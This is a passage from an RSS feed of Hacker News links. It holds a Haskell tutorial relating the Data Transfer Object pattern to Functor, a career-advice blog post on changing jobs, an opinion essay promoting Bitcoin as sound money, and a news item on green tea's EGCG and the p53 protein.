<li><a href="#lazy-evaluation">Lazy Evaluation</a> <!-- * [Functional Reactive Programming](#functional-reactive-programming) --></li>
<li><a href="#reflection">Reflection</a></li>
</ul></li>
<li><a href="#conclusions">Conclusions</a></li>
<li><a href="#some-interesting-links">Some related links</a></li>
</ul>
<h2 id="the-patternopedia">The Patternopedia</h2>
<p>The <a href="https://wiki.haskell.org/wikiupload/8/85/TMR-Issue13.pdf">Typeclassopedia</a> is a now classic paper that introduces the Haskell type classes by clarifying their algebraic and category-theoretic background. In particular it explains the relationships among those type classes.</p>
<p>In this chapter I‚Äôm taking a tour through the Typeclassopedia from a design pattern perspective. For each of the Typeclassopedia type classes I try to explain how it corresponds to structures applied in software design patterns.</p>
<p>As a reference map I have included the following chart that depicts the Relationships between type classes covered in the Typeclassopedia:</p>
<figure>
<img src="https://wiki.haskell.org/wikiupload/c/c7/Typeclassopedia-diagram.svg" alt=""><figcaption>The Haskell type classes covered by the Typeclassopedia</figcaption>
</figure>
<ul>
<li>Solid arrows point from the general to the specific; that is, if there is an arrow from Foo to Bar it means that every Bar is (or should be, or can be made into) a Foo.</li>
<li>Dotted lines indicate some other sort of relationship.</li>
<li>Monad and ArrowApply are equivalent.</li>
<li>Apply and Comonad are greyed out since they are not actually (yet?) in the standard Haskell libraries ‚àó.</li>
</ul>
<h3 id="data-transfer-object-functor">Data Transfer Object ‚Üí Functor</h3>
<blockquote>
<p>In the field of programming a data transfer object (DTO) is an object that carries data between processes. The motivation for its use is that communication between processes is usually done resorting to remote interfaces (e.g., web services), where each call is an expensive operation. Because the majority of the cost of each call is related to the round-trip time between the client and the server, one way of reducing the number of calls is to use an object (the DTO) that aggregates the data that would have been transferred by the several calls, but that is served by one call only. (quoted from <a href="https://en.wikipedia.org/wiki/Data_transfer_object">Wikipedia</a></p>
</blockquote>
<p>Data Transfer Object is a pattern from Martin Fowler‚Äôs <a href="https://martinfowler.com/eaaCatalog/dataTransferObject.html">Patterns of Enterprise Application Architecture</a>. It is typically used in multi-layered applications where data is transferred between backends and frontends.</p>
<p>The aggregation of data usually also involves a denormalization of data structures. As an example, please refer to the following diagram where two entities from the backend (<code>Album</code> and <code>Artist</code>) are assembled to a compound denormalized DTO <code>AlbumDTO</code>:</p>
<figure>
<img src="https://martinfowler.com/eaaCatalog/dtoSketch.gif" alt=""><figcaption>DTO</figcaption>
</figure>
<p>Of course, there is also an inverse mapping from <code>AlbumDTO</code> to <code>Album</code> which is not shown in this diagram.</p>
<p>In Haskell <code>Album</code>, <code>Artist</code> and <code>AlbumDTO</code> can be represented as data types with record notation:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>data</span> <span>Album</span> <span>=</span> <span>Album</span> {</span>
<span id="cb1-2"><span>    title       ::</span> <span>String</span></span>
<span id="cb1-3">  ,<span> publishDate ::</span> <span>Int</span></span>
<span id="cb1-4">  ,<span> labelName   ::</span> <span>String</span></span>
<span id="cb1-5">  ,<span> artist      ::</span> <span>Artist</span></span>
<span id="cb1-6">} <span>deriving</span> (<span>Show</span>)</span>
<span id="cb1-7"></span>
<span id="cb1-8"><span>data</span> <span>Artist</span> <span>=</span> <span>Artist</span> {</span>
<span id="cb1-9"><span>    publicName ::</span> <span>String</span></span>
<span id="cb1-10">  ,<span> realName   ::</span> <span>Maybe</span> <span>String</span></span>
<span id="cb1-11">} <span>deriving</span> (<span>Show</span>)</span>
<span id="cb1-12"></span>
<span id="cb1-13"><span>data</span> <span>AlbumDTO</span> <span>=</span> <span>AlbumDTO</span> {</span>
<span id="cb1-14"><span>    albumTitle  ::</span> <span>String</span></span>
<span id="cb1-15">  ,<span> published   ::</span> <span>Int</span></span>
<span id="cb1-16">  ,<span> label       ::</span> <span>String</span></span>
<span id="cb1-17">  ,<span> artistName  ::</span> <span>String</span></span>
<span id="cb1-18">} <span>deriving</span> (<span>Show</span>, <span>Read</span>)</span></code></pre></div>
<p>The transfer from an <code>Album</code> to an <code>AlbumDTO</code> and vice versa can be achieved by two simple functions, that perfom the intended field wise mappings:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>toAlbumDTO ::</span> <span>Album</span> <span>-&gt;</span> <span>AlbumDTO</span></span>
<span id="cb2-2">toAlbumDTO <span>Album</span> {title <span>=</span> t, publishDate <span>=</span> d, labelName <span>=</span> l, artist <span>=</span> a} <span>=</span></span>
<span id="cb2-3">  <span>AlbumDTO</span> {albumTitle <span>=</span> t, published <span>=</span> d, label <span>=</span> l, artistName <span>=</span> (publicName a)}</span>
<span id="cb2-4"></span>
<span id="cb2-5"><span>toAlbum ::</span> <span>AlbumDTO</span> <span>-&gt;</span> <span>Album</span></span>
<span id="cb2-6">toAlbum <span>AlbumDTO</span> {albumTitle <span>=</span> t, published <span>=</span> d, label <span>=</span> l, artistName <span>=</span> n} <span>=</span></span>
<span id="cb2-7">  <span>Album</span> {title <span>=</span> t, publishDate <span>=</span> d, labelName <span>=</span> l, artist <span>=</span> <span>Artist</span> {publicName <span>=</span> n, realName <span>=</span> <span>Nothing</span>}}</span></code></pre></div>
<p>In this few lines we have covered the basic idea of the DTO pattern.</p>
<p>Now, let‚Äôs consider the typical situation that you don‚Äôt have to transfer only a <em>single</em> <code>Album</code> instance but a whole list of <code>Album</code> instances, e.g.:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>albums ::</span> [<span>Album</span>]</span>
<span id="cb3-2">albums <span>=</span></span>
<span id="cb3-3">    [</span>
<span id="cb3-4">      <span>Album</span> {title <span>=</span> <span>"Microgravity"</span>,</span>
<span id="cb3-5">             publishDate <span>=</span> <span>1991</span>,</span>
<span id="cb3-6">             labelName <span>=</span> <span>"Origo Sound"</span>,</span>
<span id="cb3-7">             artist <span>=</span> <span>Artist</span> {publicName <span>=</span> <span>"Biosphere"</span>, realName <span>=</span> <span>Just</span> <span>"Geir Jenssen"</span>}}</span>
<span id="cb3-8">    , <span>Album</span> {title <span>=</span> <span>"Apollo - Atmospheres &amp; Soundtracks"</span>,</span>
<span id="cb3-9">             publishDate <span>=</span> <span>1983</span>,</span>
<span id="cb3-10">             labelName <span>=</span> <span>"Editions EG"</span>,</span>
<span id="cb3-11">             artist <span>=</span> <span>Artist</span> {publicName <span>=</span> <span>"Brian Eno"</span>, realName <span>=</span> <span>Just</span> <span>"Brian Peter George St. John le Baptiste de la Salle Eno"</span>}}</span>
<span id="cb3-12">    ]</span></code></pre></div>
<p>In this case we have to apply the <code>toAlbumDTO</code> function to all elements of the list. In Haskell this <em>higher order</em> operation is called <code>map</code>:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>map</span><span> ::</span> (a <span>-&gt;</span> b) <span>-&gt;</span> [a] <span>-&gt;</span> [b]</span>
<span id="cb4-2"><span>map</span> _f []    <span>=</span> []</span>
<span id="cb4-3"><span>map</span> f (x<span>:</span>xs) <span>=</span> f x <span>:</span> <span>map</span> f xs</span></code></pre></div>
<p><code>map</code> takes a function <code>f :: (a -&gt; b)</code> (a function from type <code>a</code> to type <code>b</code>) and an <code>[a]</code> list and returns a <code>[b]</code> list. The <code>b</code> elements are produced by applying the function <code>f</code> to each element of the input list. Applying <code>toAlbumDTO</code> to a list of albums can thus be done in the Haskell REPL GHCi as follows:</p>
<div id="cb5"><pre><code><span id="cb5-1">Œª<span>&gt;</span> <span>map</span> toAlbumDTO albums</span>
<span id="cb5-2">[<span>AlbumDTO</span> {albumTitle <span>=</span> <span>"Microgravity"</span>, published <span>=</span> <span>1991</span>, label <span>=</span> <span>"Origo Sound"</span>, artistName <span>=</span> <span>"Biosphere"</span>},</span>
<span id="cb5-3"> <span>AlbumDTO</span> {albumTitle <span>=</span> <span>"Apollo - Atmospheres &amp; Soundtracks"</span>, published <span>=</span> <span>1983</span>, label <span>=</span> <span>"Editions EG"</span>, artistName <span>=</span> <span>"Brian Eno"</span>}]</span></code></pre></div>
<p>This mapping of functions over lists is a basic technique known in many functional languages. In Haskell further generalises this technique with the concept of the <code>Functor</code> type class.</p>
<blockquote>
<p>The <code>Functor</code> class is the most basic and ubiquitous type class in the Haskell libraries. A simple intuition is that a <code>Functor</code> represents a ‚Äúcontainer‚Äù of some sort, along with the ability to apply a function uniformly to every element in the container. For example, a list is a container of elements, and we can apply a function to every element of a list, using <code>map</code>. As another example, a binary tree is also a container of elements, and it‚Äôs not hard to come up with a way to recursively apply a function to every element in a tree.</p>
<p>Another intuition is that a Functor represents some sort of ‚Äúcomputational context‚Äù. This intuition is generally more useful, but is more difficult to explain, precisely because it is so general.</p>
<p>Quoted from <a href="https://wiki.haskell.org/Typeclassopedia#Functor">Typeclassopedia</a></p>
</blockquote>
<p>Basically, all instances of the <code>Functor</code> type class must provide a function <code>fmap</code>:</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>class</span>  <span>Functor</span> f  <span>where</span></span>
<span id="cb6-2"><span>    fmap ::</span> (a <span>-&gt;</span> b) <span>-&gt;</span> f a <span>-&gt;</span> f b</span></code></pre></div>
<p>For Lists the implementation is simply the <code>map</code> function that we already have seen above:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>instance</span> <span>Functor</span> [] <span>where</span></span>
<span id="cb7-2">    <span>fmap</span> <span>=</span> <span>map</span></span></code></pre></div>
<p>Functors have interesting properties, they fulfill the two so called <em>functor laws</em>, which are part of the definition of a mathematical functor:</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>fmap</span> <span>id</span> <span>=</span> <span>id</span>                        <span>-- (1)</span></span>
<span id="cb8-2"><span>fmap</span> (g <span>.</span> h) <span>=</span> (<span>fmap</span> g) <span>.</span> (<span>fmap</span> h)  <span>-- (2)</span></span></code></pre></div>
<p>The first law <code>(1)</code> states that mapping the identity function over every item in a container has no effect.</p>
<p>The second <code>(2)</code> says that mapping a composition of two functions over every item in a container is the same as first mapping one function, and then mapping the other.</p>
<p>These laws are very useful when we consider composing complex mappings from simpler operations.</p>
<p>Say we want to extend our DTO mapping functionality by also providing some kind of marshalling. For a single album instance, we can use function composition <code>(f . g) x == f (g x)</code>, which is defined in Haskell as:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>(.) ::</span> (b <span>-&gt;</span> c) <span>-&gt;</span> (a <span>-&gt;</span> b) <span>-&gt;</span> a <span>-&gt;</span> c</span>
<span id="cb9-2">(<span>.</span>) f g x <span>=</span> f (g x)</span></code></pre></div>
<p>In the following GHCi session we are using <code>(.)</code> to first convert an <code>Album</code> to its <code>AlbumDTO</code> representation and then turn that into a <code>String</code> by using the <code>show</code> function:</p>
<div id="cb10"><pre><code><span id="cb10-1">Œª<span>&gt;</span> album1 <span>=</span> albums <span>!!</span> <span>0</span></span>
<span id="cb10-2">Œª<span>&gt;</span> <span>print</span> album1</span>
<span id="cb10-3"><span>Album</span> {title <span>=</span> <span>"Microgravity"</span>, publishDate <span>=</span> <span>1991</span>, labelName <span>=</span> <span>"Origo Sound"</span>, artist <span>=</span> <span>Artist</span> {publicName <span>=</span> <span>"Biosphere"</span>, realName <span>=</span> <span>Just</span> <span>"Geir Jenssen"</span>}}</span>
<span id="cb10-4">Œª<span>&gt;</span> marshalled <span>=</span> (<span>show</span> <span>.</span> toAlbumDTO) album1</span>
<span id="cb10-5">Œª<span>&gt;</span> <span>:</span>t marshalled</span>
<span id="cb10-6"><span>marshalled ::</span> <span>String</span></span>
<span id="cb10-7">Œª<span>&gt;</span> <span>print</span> marshalled</span>
<span id="cb10-8"><span>"AlbumDTO {albumTitle = \"Microgravity\", ‚Ä¶</span></span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html">https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html</a></em></p>]]>
            </description>
            <link>https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126002</guid>
            <pubDate>Sat, 13 Feb 2021 19:29:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Changing Jobs? The Grass Isn't Always Greener]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26125983">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://www.leggetter.co.uk/blog/jobs-grass-isnt-always-greener | <a href="https://web.archive.org/web/*/https://www.leggetter.co.uk/blog/jobs-grass-isnt-always-greener">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><a href="https://share.descript.com/view/gVn4KDWrmsE">Listen to the audio version on Descript üîâ</a></p>

<p>It's been just over eight months since I left Nexmo/Vonage, where I'd been for over four years, and I'll admit to having spent a few hours reflecting upon my decision to leave. It's also that time of year when many people seem to get a new job and change companies so now seems like a good time to share some advice and some of my experiences.</p>

<p>When frustrated or tired of a job the most obvious reaction for many is to look for another job at another organisation. Sometimes a change in scenery can be what you need. The grass may be greener on the other side. But, there's also a chance it won't be and a move may not always be what you need. So, it's worth considering alternative options.</p>

<h2 id="take-a-break"><a href="#take-a-break">Take a Break</a></h2>

<p>Before you make any hasty decisions take some time off from your current role and try not to think about it. This will give your subconscious a chance to really process things. If you need an extended amount of time and if you've been at a company for a long time then a sabbatical may be an option. Failing that, and not everyone will be able to do this, you could consider some unpaid leave.</p>

<p>With your mind hopefully relaxed, and if you still feel like a change is required, it's time to consider your options.</p>

<h2 id="is-the-reason-for-moving-on-fundamental?"><a href="#is-the-reason-for-moving-on-fundamental?">Is the Reason for Moving on Fundamental?</a></h2>

<p>It's important to ask yourself if you're moving on for a <strong>fundamental</strong> reason. For example, do you dislike the company values, mission, goals or culture? These things are very difficult to change unless you are part of the company leadership team. Some teams within organisations can have their own culture, values and mission, and generally, be able to function independently. But, for a team to be successful within a business over a long period there has to be a reasonable alignment between a team and a company. So, unless you see positive leadership changes coming this is probably a scenario where the best thing is to move on.</p>

<p>If you're considering moving on for reasons other than a fundamental problem with the company you work for, there are alternatives. Which of these are available will depend on the company but they are worth exploring.</p>

<h2 id="try-a-different-role"><a href="#try-a-different-role">Try a Different Role</a></h2>

<p>If you have a reasonably broad range of skills, the company you work for requires some of your other skills, and another role available, trying that different role may be an option. Some companies may invest in retraining you so that you can take on that role.</p>

<p>For example, within <a href="https://www.leggetter.co.uk/2016/02/03/defining-developer-relations.html">Developer Relations</a> it may be possible to move from Developer Advocacy, where there's a requirement for a broad range of skills, to something more focused like Developer Education.</p>

<h2 id="propose-an-alternative-role"><a href="#propose-an-alternative-role">Propose an Alternative Role</a></h2>

<p>If there are things that you want to do that you're not presently getting to do why not see if you can create an alignment between the company, team and your goals?</p>

<p>Back in 2010 while working as an engineering team lead at Caplin Systems, I decided I wanted to focus on <a href="https://www.leggetter.co.uk/real-time-web-technologies-guide/">real-time web technologies</a>. I liked the people I worked with and the company I worked for was progressive and supportive. So, I spoke to the leadership team about my goals and we came up with the idea of putting our real-time technology in the cloud and making a <a href="https://www.programmableweb.com/api/kwwika">hosted service</a> available to developers. This created a new role for me and began my journey into Developer Relations.</p>

<h2 id="change-teams"><a href="#change-teams">Change Teams</a></h2>

<p>Can you change teams? This is likely only going to be an option at larger organisations where there are multiple teams with the same role. But moving teams, working with new people and taking on new challenges could be the change that you need.</p>

<h2 id="maybe-the-grass-will-be-greener"><a href="#maybe-the-grass-will-be-greener">Maybe the Grass Will be Greener</a></h2>

<p>Once you've considered all the alternatives you may decide it really is time to move on.</p>

<p>When I decided to move on from Nexmo/Vonage I was sure it was the right move but, over the past eight months, I have had the occasional moment where I wondered if I made a mistake. I'm very proud of the Platform &amp; Developer Experience team (including DevRel) we'd built at Nexmo/Vonage and many of the people in the wider organisation were nice.</p>

<p>However, upon reflection, I did make the right decision. For me it was fundamental: I felt that the company was going in the wrong direction from both a cultural and product perspective. I also looked at the VP (in all but title) job that - through the team's success - I‚Äôd ended up in and it was not the sort of role I wanted within Vonage at that time. So I discussed the situation with my colleagues, with leadership, wrote up a job spec for my successor and decided it was time to move on.</p>

<p>So, if you're reading this because you've been wondering if the grass will be greener, please do ensure you've considered all your options before making your decision. Whatever you decide, good luck! üçÄ</p>

<p><small><span>Photo by <a href="https://unsplash.com/@dimhou?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Dimitri Houtteman</a> on <a href="https://unsplash.com/s/photos/grass?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></span></small></p>

</div></div>]]>
            </description>
            <link>https://www.leggetter.co.uk/blog/jobs-grass-isnt-always-greener</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125983</guid>
            <pubDate>Sat, 13 Feb 2021 19:25:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Information Theory of Money]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26125872">thread link</a>) | @Bluestein
<br/>
February 13, 2021 | https://www.danheld.com/blog/2019/12/27/the-information-theory-of-money | <a href="https://web.archive.org/web/*/https://www.danheld.com/blog/2019/12/27/the-information-theory-of-money">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-932acedf8b238320f52f"><div><h3><strong>Prices reflect information</strong></h3><blockquote><p>‚ÄúIn a free market economic system, prices are knowledge, and the signals that communicate information. Prices are not simply a tool to allow capitalists to profit; they are the information system of economic production, communicating knowledge across the world and coordinating the complex processes of production.‚Äù</p><p>‚Äî Saifedean Ammous</p></blockquote><p>Prices are the coordinating force of a free market system. Each individual decision-maker can rely on the prices of goods and services to help with their decision making, as the prices themselves are a distillation of all known market information into a single metric. In other words, the compression of all relevant data is ultimately manifested as price (for the more technie minded, it‚Äôs a one-way hash function).</p><p>Each individual‚Äôs buy and sell decisions, in turn, further shape prices that carry this altered information back out into the market. Some of you may have heard of this from ‚ÄúEfficient market hypothesis‚Äù which is about how information in the market is reflected in the price of assets like equities.</p><h3><strong>Money is the measuring stick</strong></h3><blockquote><p>‚ÄúMoney is the central information utility of the world economy. As a medium of exchange, store of value, and unit of account, money is the critical vessel of information about the conditions of markets.‚Äù ‚Äî George Gilder</p></blockquote><p>Capitalist economies are not equilibrium systems but dynamic domains of entrepreneurial experiments. Money should be a standard of measure for the outcomes of entrepreneurial experiments.</p><p>The essence of Capitalism is all about the efficient allocation of capital given the constraints of scarce resources and time. Companies are experiments on how to best allocate capital, and money is the standard measure for efficiency. Making money represents the efficient allocation of capital, losing money is not an efficient use of capital. And competition means decentralized planning by many separate companies and people to solve a problem in the market.</p><p>Capitalism, much like nature (evolution = random walk), is about experimentation.</p><h3><strong>Information is Decentralized</strong></h3><p>A centrally planned economy could never match the efficiency of the open market because what is known by a single agent is only a small fraction of the sum total of knowledge held by all members of society (Hayek‚Äôs ‚Äú<a href="https://en.wikipedia.org/wiki/Local_knowledge_problem">Local Knowledge Problem</a>‚Äù). A decentralized economy thus complements the dispersed nature of information spread throughout society. Each company is an attempt to take the local knowledge that it has and create a good or service that ultimately is the correct capital allocation (aka profit).</p><p>To highlight how decentralized this information is, I‚Äôm going to give an example by Milton Friedman who made the statement: ‚ÄúThere‚Äôs not a single person in the world who knows how to make a pencil:</p><ul data-rte-list="default"><li><p>The wood comes from a tree</p></li><li><p>To cut down that tree, it took a saw</p></li><li><p>To make the saw, it took steel. To make steel, it took iron ore</p></li><li><p>Graphite, comes from some mines in South America</p></li><li><p>The eraser, which is rubber, probably comes from the tropics</p></li><li><p>Or the yellow paint</p></li><li><p>Or the glue that holds it together</p></li></ul><p>There was no central planning office. It was the magic of the price system.‚Äù</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1610323211272_9027"><div><h3><strong>Central banks have an unsolvable data problem</strong></h3><p>Central banks inherently have a data problem. There‚Äôs an ingestion, processing, decision bottleneck ‚Äî same as any electronic signal processing system. An economy cannot be planned by a central authority, because there is no way that a central authority can have all of the necessary knowledge to make the best decision at any single point in time, let alone all points in time.</p><blockquote><p>‚ÄúIt is a problem of the utilization of knowledge which is not given to anyone in its totality‚Äù</p><p>‚Äî Hayek</p></blockquote><p>To operate effectively, central banks would have to ingest trillions of data points daily, and ingest those data points in a perfect manner which is impossible. Every single uber taken, every single sandwich purchased, every single in-app purchase.</p><blockquote><p>‚ÄúWe need to believe we live in a predictable, controllable world, so we turn to authoritative-sounding people who promise to satisfy that need.‚Äù ‚Äî Philip Tetlock</p></blockquote><p>We‚Äôve created central banks because we want the world to make sense, and we want to feel that there is someone in charge. Even if we were able to ingest perfect data, it is hard to infer simple causality for this complex, chaotic system which involves billions of decision makers. While determining the relationship between weather and crops might seem easy, how do we determine the causality of burrito demand? Economics isn‚Äôt like the sciences, we are hamstrung by small or incomplete sample sizes. We can‚Äôt re-run the Dot com bubble with a different central bank or a different President.</p><p>This brings us to how central banks measure impact and make decisions. There is a classic product saying that goes ‚ÄúIf you can‚Äôt measure it you can‚Äôt manage it.‚Äù It‚Äôs hard to even&nbsp;<a href="https://www.smithsonianmag.com/science-nature/redefine-kilogram-180970798/" target="_blank">measure a kilogram</a>&nbsp;with extreme precision, so how could we possibly measure inflation properly? (ex: CPI excludes food and energy!)</p><p>Since big events come out of nowhere, forecasts may do more harm than good, giving the illusion of predictability in a world where unforeseen events control most outcomes (Aka black swan events). As Carl Richards says&nbsp;<em>‚ÄúRisk is what‚Äôs left over when you think you‚Äôve thought of everything.</em>‚Äù Daniel Kahneman also has a great take on the dangers of using history as our guide:</p><blockquote><p>‚ÄúHindsight, the ability to explain the past, gives us the illusion that the world is understandable. It gives us the illusion that the world makes sense, even when it doesn‚Äôt make sense. That‚Äôs a big deal in producing mistakes in many fields.‚Äù</p></blockquote><p>Here‚Äôs a useful analogy: Essentially the Fed is driving the car, which is the economy, only using the rearview mirror which is foggy, and the front windshield is opaque (you can‚Äôt see the future). How could the Fed possibly drive the car with any accuracy? What if we just let the car self adjust to the conditions of the road?</p><p>History cannot be interpreted without the aid of imagination and intuition. The sheer quantity of evidence is so overwhelming that selection is inevitable.</p><p>So what is our alternative?</p><h3><strong>Sound Money</strong></h3><blockquote><p>‚ÄúSound money is the equivalent of scientific integrity: the system must not permit the manipulation of data after the experiment has taken place.‚Äù ‚Äî Adam Tach√©</p></blockquote><p>Sound money keeps the ruler settings fixed so results cannot be altered by a centralized planning mechanism.</p><p>And Bitcoin is the perfect iteration of sound money. Bitcoin has a hard cap for several reasons: being a precise measuring stick, reducing political attack vectors, and encouraging speculative bubbles which act as a viral loop.</p><p>But why 21M? Why not 100M?</p><p>It‚Äôs precise length is irrelevant. What matters is just that there is a fixed amount. As economic activity moves from a primitive scale, it becomes harder for individuals to make decisions without having a fixed unit of account with which to compare value.</p><p>Regarding political attack vectors, Satoshi felt that setting a ‚Äúproper‚Äù rate of inflation rate was impossible so he decided to remove human decision making from the process. Satoshi has two quotes regarding fixed supply that support this conclusion:</p><blockquote><p>‚ÄúIndeed there is nobody to act as central bank or federal reserve to adjust the money supply as the population of users grows. That would have required a trusted party to determine the value, because I don‚Äôt know a way for software to know the real world value of things.‚Äù</p></blockquote><p>Satoshi also says</p><blockquote><p>‚ÄúIf there was some clever way, or if we wanted to trust someone to actively manage the money supply to peg it to something, the rules could have been programmed for that.‚Äù</p></blockquote><p>Finally, Satoshi hypothesized that a fixed supply might create speculative bubbles.</p><p><em>‚ÄúAs the number of users grows, the value per coin increases. It has the potential for a positive feedback loop; as users increase, the value goes up, which could attract more users to take advantage of the increasing value.‚Äù</em></p><h3><strong>Implications of Sound Money</strong></h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1577480042477_7843"><div><p><br>Bitcoin is the ultimate safe haven asset. As more and more people buy into Bitcoin and that narrative, it becomes the de facto risk off asset.</p><p>Post hyperbitcoiniation, when Bitcoin is the SoV, MoE, and UoA, Bitcoin will reflect the most accurate ‚Äúrisk free‚Äù rate of return that we‚Äôve ever had, which enables the economy and market participants to most efficiently allocate resources. Each market participant, both individual investors and corporations, make the risk on/risk off decision which is then manifested in Bitcoin‚Äôs price.</p><p>And finally, when Bitcoin is the unit of account and used by every business, market participants can view the flow of funds of their suppliers and customers in real time via their publicly disclosed Bitcoin addresses. This transparency makes markets ultra efficient through the best processing of information.</p><p>Bitcoin rearchitects how capital is efficiently allocated in our economy, ultimately creating a world with more abundance and resources for all.</p><p>The Bitcoin Times Ed 2 is the collaborative work of 8 writers &amp; 1 designer with the intent to educate, inspire and spread ideas on bitcoin.</p><p>Each section will be released on Medium as a free long form article, and the full, compiled version of the Bitcoin Times will be available for free at the link below. In 2020, we‚Äôll release a limited edition hard cover collectible, for purchase, which you‚Äôll be notified of by email if you download the free pdf.</p><p>If you found value in this or any of the other essays and articles, please support each of the contributors by sharing it out &amp; following their work.<br></p></div></div></div>]]>
            </description>
            <link>https://www.danheld.com/blog/2019/12/27/the-information-theory-of-money</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125872</guid>
            <pubDate>Sat, 13 Feb 2021 19:12:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Antioxidant in green tea may increase levels of p53, an anti-cancer protein]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26125671">thread link</a>) | @finphil
<br/>
February 13, 2021 | https://nuadox.com/post/643030841522536448/green-tea-p53-protein | <a href="https://web.archive.org/web/*/https://nuadox.com/post/643030841522536448/green-tea-p53-protein">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="643030841522536448">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/643030841522536448/green-tea-p53-protein"><h2>Antioxidant in green tea may increase levels of p53, an anti-cancer protein</h2></a>
                                <figure data-orig-width="1280" data-orig-height="855"><img src="https://64.media.tumblr.com/f6a0a630187afd9268b0372fbcc4e09e/1ae3647e82144769-00/s1280x1920/fc9b00fcd69f86ea10d75049e36b11fb66730a5e.jpg" alt="image" data-orig-width="1280" data-orig-height="855" width="1280" height="855"></figure><p><b>- By&nbsp;<a href="https://href.li/?https://info.rpi.edu/people/mary-l-martialay">Mary L. Martialay</a> ,&nbsp;<a href="https://href.li/?https://www.rpi.edu/">Rensselaer Polytechnic Institute</a> -</b></p><p>An antioxidant found in green tea may increase levels of p53, a natural anti-cancer protein, known as the ‚Äúguardian of the genome‚Äù for its ability to repair DNA damage or destroy cancerous cells.&nbsp;</p><p>Published on February 12 in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41467-021-21258-5&amp;t=NjViNzg2NWJkZWM5NzZiY2E0MjY4NWRiMzQ1YTNhZWNhMTJjNWNjZixlUURrZXFETg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F643030841522536448%2Fgreen-tea-p53-protein&amp;m=0&amp;ts=1613524009"><i>Nature Communications</i>,</a> a study of the direct interaction between p53 and the green tea compound, epigallocatechin gallate (EGCG), points to a new target for cancer drug discovery.</p><p>‚ÄúBoth p53 and EGCG molecules are extremely interesting. Mutations in p53 are found in over 50% of human cancer, while EGCG is the major anti-oxidant in green tea, a popular beverage worldwide,‚Äù said <a href="https://href.li/?http://homepages.rpi.edu/~wangc5/index.html">Chunyu Wang</a>, corresponding author and a professor of biological sciences at <a href="https://href.li/?https://rpi.edu/">Rensselaer Polytechnic Institute</a>. ‚ÄúNow we find that there is a previously unknown, direct interaction between the two, which points to a new path for developing anti-cancer drugs. Our work helps to explain how EGCG is able to boost p53‚Äôs anti-cancer activity, opening the door to developing drugs with EGCG-like compounds.‚Äù</p><p>Wang, a member of the <a href="https://href.li/?https://www.youtube.com/watch?v=Hm_O0FqYSt4">Rensselaer Center for Biotechnology and Interdisciplinary Studies</a>, is an expert in using nuclear magnetic resonance spectroscopy to study <a href="https://href.li/?https://news.rpi.edu/content/2021/01/26/new-nih-grant-supports-single-molecule-study-protein-key-alzheimer-%E2%80%99s-disease">specific mechanisms in Alzheimer‚Äôs disease</a> and <a href="https://href.li/?https://news.rpi.edu/content/2017/02/27/hedgehog-cancer-and-zinc">cancer</a>, including p53, which he described as ‚Äúarguably the most important protein in human cancer.‚Äù</p><p>P53 has several well-known anti-cancer functions, including halting cell growth to allow for DNA repair, activating DNA repair, and initiating programmed cell death ‚Äî called apoptosis ‚Äî if DNA damage cannot be repaired. One end of the protein, known as the N-terminal domain, has a flexible shape, and therefore, can potentially serve several functions depending on its interaction with multiple molecules.</p><p>EGCG is a natural antioxidant, which means it helps to undo the near constant damage caused during oxygen metabolism. Found in abundance in green tea, EGCG is also packaged as an herbal supplement.</p><p>Wang‚Äôs team found that the interaction between EGCG and p53 preserves the protein against degradation. Typically, after being produced within the body, p53 is quickly degraded when the N-terminal domain interacts with a protein called MDM2. This regular cycle of production and degradation holds p53 levels at a low constant.</p><p>‚ÄúBoth EGCG and MDM2 bind at the same place on p53, the N-terminal domain, so EGCG competes with MDM2,‚Äù said Wang. ‚ÄúWhen EGCG binds with p53, the protein is not being degraded through MDM2, so the level of p53 will increase with the direct interaction with EGCG, and that means there is more p53 for anti-cancer function. This is a very important interaction.‚Äù</p><p>‚ÄúBy developing an understanding of the molecular-level mechanisms that control key biochemical interactions linked to devastating illnesses such as cancer and Alzheimer‚Äôs disease, Chunyu‚Äôs research is laying the groundwork for new and successful therapies,‚Äù said Curt Breneman, dean of the Rensselaer School of Science.</p><p>‚Äì</p><p><b>Source:&nbsp;<a href="https://href.li/?https://news.rpi.edu/content/2021/02/12/green-tea-compound-aids-p53-guardian-genome-and-tumor-suppressor">Rensselaer Polytechnic Institute</a></b></p><p><b>Full study:</b>&nbsp;‚ÄúEGCG binds intrinsically disordered N-terminal domain of p53 and 